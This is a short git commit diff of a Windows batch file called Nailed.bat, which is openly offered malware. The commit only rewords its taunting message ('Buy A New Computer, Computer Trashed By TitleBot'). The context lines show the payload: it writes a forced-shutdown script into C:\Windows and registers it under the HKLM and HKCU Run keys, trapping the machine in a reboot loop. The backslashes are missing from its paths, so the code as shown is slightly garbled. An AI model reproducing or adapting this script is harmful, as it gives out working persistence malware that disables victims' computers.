b9060cfb8843656cf6f0ee2d111034df8cb6afab
TitleBot <106438785+TitleBot@users.noreply.github.com>
2022-05-28 14:14:04 -0400

    Update Nailed.bat

--- Nailed.bat
+++ Nailed.bat
@@ -4,5 +4,5 @@ echo shutdown -r -t 11 -f>>C:Windowshartlell.bat
 echo end>>C:Windowshartlell.bat
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d C:Windowshartlell.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d C:Windowshartlell.bat /f
-echo You are Nailed, Buy A New Computer, Computer trashed by TitleBot, on GitHub.
+echo You're Nailed, Buy A New Computer, Computer Trashed By TitleBot, On GitHub.
 PAUSE
